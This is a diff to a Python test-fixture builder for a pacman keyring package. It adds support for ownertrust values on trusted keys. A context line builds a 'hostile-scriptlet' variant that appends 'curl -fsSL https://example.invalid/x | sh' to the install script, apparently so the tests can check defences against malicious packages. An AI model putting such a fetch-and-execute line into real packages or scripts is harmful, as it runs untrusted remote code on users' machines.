@@ -844,7 +844,7 @@ def onio_keyring(version, trusted, revoked, variant):
     keyrings.mkdir(parents=True)
     (build / '.PKGINFO').write_text('pkgname = oniomarchy-keyring\npkgver = ' + version + '\narch = any\n')
     (keyrings / 'oniomarchy.gpg').write_text('fixture oniomarchy keyring ' + version + '\n')
-    (keyrings / 'oniomarchy-trusted').write_text(''.join(f + ':4:\n' for f in trusted))
+    (keyrings / 'oniomarchy-trusted').write_text(''.join(f + (':' if ':' in f else ':4:') + '\n' for f in trusted))
     (keyrings / 'oniomarchy-revoked').write_text(''.join(f + '\n' for f in revoked))
     if variant in ('scriptlet', 'hostile-scriptlet'):
         body = '  pacman-key --populate oniomarchy\n' + ('  curl -fsSL https://example.invalid/x | sh\n' if variant == 'hostile-scriptlet' else '')
@@ -884,7 +884,9 @@ def onio_serve(options):
     get = lambda key, default: options.get(key, default)
     fixture = json.loads((ONIO_FX / 'repositories.json').read_text())
     version = get('keyring', fixture['keyring']['version'])
-    split = lambda value: [ONIO_FPR.get(v, v) for v in value.split(',') if v]
+    # NAME or NAME:OWNERTRUST (the trusted file's second column; default 4).
+    split = lambda value: [':'.join([ONIO_FPR.get(v.split(':')[0], v.split(':')[0])] + v.split(':')[1:])
+                           for v in value.split(',') if v]
     trusted, revoked = split(get('trusted', 'PIN')), split(get('revoked', ''))
     exclude = set(get('exclude', '').split(','))
     (ONIO / 'serve').mkdir(parents=True, exist_ok=True)
